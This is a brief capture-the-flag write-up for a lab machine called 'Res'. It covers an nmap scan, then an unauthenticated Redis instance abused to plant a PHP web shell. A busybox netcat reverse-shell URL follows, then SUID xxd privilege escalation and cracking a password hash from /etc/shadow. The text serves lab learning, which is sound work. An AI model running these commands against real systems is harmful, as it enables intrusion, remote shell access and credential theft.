# Res

### Res
Nmap scan shows ports 80 and 6379(Redis) open. 

    PORT     STATE SERVICE VERSION
    80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    6379/tcp open  redis   Redis key-value store 6.0.7
After some online search, I found that this redis version, if open to the internet, is vulnerable to RCE.<br />
Basically we need to access redis with `redis-cli -h target_IP -p target_PORT` (this instance does not have any username or password to prompt). <br />
Next, run the following commands inside the redis client: 

    config set dir /var/www/html
    config set dbfilename redis.php
    set test "<?php system($_GET['cmd']); ?>"
    save

Next, open a netcat listener and visit `http://TARGET_IP/redis.php?cmd=busybox%20nc%20YOUR_IP%20YOUR_PORT%20-e%20sh` to get a reverse shell. Now for privesc, I used linpeas to enumerate possible privilege escalation paths. I found the SUID bit set on the `xxd` binary. <br />
The exploit for this binary can be found on [gtfobins](https://gtfobins.github.io/gtfobins/xxd/#suid), just run `xxd /root/root.txt | xxd -r` to read the root flag.<br />
To get vianka's password and answer the question, just read the `/etc/shadow` file and crack vianka's hash using john.

